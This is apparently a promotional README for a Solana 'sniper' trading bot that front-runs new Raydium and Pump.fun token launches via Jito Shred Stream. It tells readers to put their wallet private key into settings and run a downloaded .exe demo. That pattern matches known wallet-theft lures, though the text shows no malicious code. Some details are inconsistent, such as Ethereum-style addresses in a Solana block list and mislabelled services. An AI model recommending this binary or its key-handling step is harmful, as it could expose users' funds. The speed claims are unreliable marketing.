# Solana Ultra-Fast New Token Sniper with Jito Shred Stream 🚀⚡

## Overview

Introducing the **Solana Ultra-Fast New Token Sniper** powered by **Jito Shred Stream** and written in **Rust** 🦀. This cutting-edge sniper detects newly launched tokens on **Raydium** and **Pump.fun** and executes buys at unprecedented speeds using Jito's low-latency shred streaming technology. Built with Rust for maximum performance, memory safety, and security. The ultimate tool for both novice and experienced traders seeking the competitive edge.

---

## Key Features

### ⚡ Jito Shred Stream Integration
- **Bleeding-Edge Speed**: Harness the power of **Jito Shred Stream** for the fastest possible transaction detection and execution. Get ahead of the competition with direct shred-level data access!

### 🚀 Unmatched Performance
- **Lightning-Quick Transactions**: Leveraging Rust's exceptional performance combined with Jito Shred Stream, snipe new tokens in the same block. Zero delays, maximum opportunities!

### 🔒 Safety First
- **Robust Security**: Rust's safety guarantees minimize bugs and vulnerabilities, ensuring your trading activities are secure. Trade with confidence and peace of mind.

### 📊 Multiple gRPC Connections
- **Stay Updated**: Effortlessly connect to top Solana data providers like **Helius** and **Yellowstone** through multiple gRPC connections. Get real-time updates and make informed trading decisions.

### 👩‍💻 User-Friendly Interface
- **Intuitive Design**: Our sniper bot features a clean and accessible interface, making it easy for users of all experience levels to navigate. Start trading in no time!

### 🛠️ Rich Utilities
- **Advanced Features**:
  - **jito-shred-stream**: Access raw shred data for the fastest possible transaction detection.
  - **jito-confirm**: Engage in low-latency transactions on platforms like Raydium and Pumpfun.
  - **jito-bundle**: Bundle buy/sell actions with up to **20 wallets** in Raydium/Pumpfun, enhancing your trading strategy and flexibility.

---

## Directory Structure

```
src/
├── core/
│   ├── token.rs        # Token definitions and handling
│   └── tx.rs        # Transaction handling
| 
├── engine/
│   ├── swap.rs        # Token swap(buy/sell) functionalities in various Dexs
│   └── monitor        # New token monitoring(and parse tx) in Dexs using geyser rpc, and normal rpc
│       └── helius.rs        # Helius gRpc for tx listen and parse.
│       └── yellowstone.rs        # Yellowstone gRpc for tx listen and parse.
|
├── dex/
│   ├── pump_fun.rs        # Pump.fun
│   ├── raydium.rs        # Raydium
│   ├── meteora.rs        # Meteora
│   └── orca.rs        # Orca
│
├── services/
│   ├── jito.rs        # Jito service provides ultra-fast transaction confirmation
│   ├── nozomi.rs        # Jito service provides ultra-fast transaction confirmation
│   ├── zeroslot.rs        # Jito service provides ultra-fast transaction confirmation
│   └── nextblock.rs        # NextBlock service provides the ultra-fast transaction confirmation in unique way
|
├── common/
│   ├── logger.rs        # Logs to be clean and convenient to monitor.
│   └── utils.rs        # Utility functions used across the project
│
├── lib.rs
└── main.rs
```
---
## Trial Versions

### **Solana Pumpfun Sniper - Jito Shredstream (Demo)**  
> 🗂️ [pumpfun_sniper_jitoshred_demo.zip](https://github.com/user-attachments/files/23825331/pumpfun_sniper_jitoshred_demo.zip)

**Strategy Details:**
- **Entry Trigger:** Monitor user purchases of the new tokens on Dex; execute a buy order upon detection.
- **Exit Trigger:** Monitor user sales of tokens by checking tp/sl; execute a sell order upon detection.
- **Time Limitation:** If a position remains open for more than 60 seconds, initiate an automatic sell.  
*(Note: The tp/sl, as well as the 60-second time limit, are adjustable parameters via environment settings.)*
---

### How To Run
1. Environment Variables Settings
```plaintext
PRIVATE_KEY= # your wallet priv_key
RPC_API_KEY= #your helius rpc api-key (Please use premium version that has Geyser Enhanced Websocket)
SLIPPAGE=10
JITO_BLOCK_ENGINE_URL=https://ny.mainnet.block-engine.jito.wtf
JITO_TIP_VALUE=0.00927
TIME_EXCEED=60 # seconds; time limit for volume non-increasing
TOKEN_AMOUNT=0.0000001 # token amount to purchase
TP=3 #3 times
SL=0.5 #50 percentage
```
2. Add the wallet address you want to block on a new line and save the file.
```
0x1234567890abcdef1234567890abcdef12345678
0xabcdef1234567890abcdef1234567890abcdef12
```
3. Run `pumpfun_sniper_jitoshred_demo.exe`.

---
### Test Result: Same Block
![2-22-2025-09-41](https://github.com/user-attachments/assets/2ded6e35-7575-491e-ac43-5f463b0b9cba)

- Detect: https://solscan.io/tx/5o7ajnZ9CRf7FBYEvydu8vapJJDWtKCvRFiTUBmbeu2FmmDhAQQy3c9YFFhpTucr2SZcrf2aUsDanEVjYgwN9kBc
- Bought: https://solscan.io/tx/3vgim3MwJsdtahXqfW2DrzTAWpVQ8EUTed2cjzHuqxSfUpfp72mgzZhiVosWaCUHdqJTDHpQaYh5xN7rkHGmzqWv
- Dexscreener: https://dexscreener.com/solana/A1zZXCq2DmqwVD4fLDzmgQ3ceY6LQnMBVokejqnHpump

---
## Donate

👉👌 6vT7nrqtbXDWVc8cRUtifxgfDZi19aW7qhcZg2hSepwb

---
## Recommended Server Platforms

For optimal performance with Jito Shred Stream, we recommend using a dedicated server located in **New York (NY)** from one of these providers:

| Provider | Website |
|----------|---------|
| **Cherry Servers** | [cherryservers.com](https://www.cherryservers.com) |
| **Teraswitch** | [teraswitch.com](https://teraswitch.com) |
| **Latitude.sh** | [latitude.sh](https://www.latitude.sh) |

> 💡 **Tip**: Low-latency NY servers are critical for maximizing Jito Shred Stream performance and achieving same-block execution.

---
## Support

For support and further inquiries, please connect via Telegram.
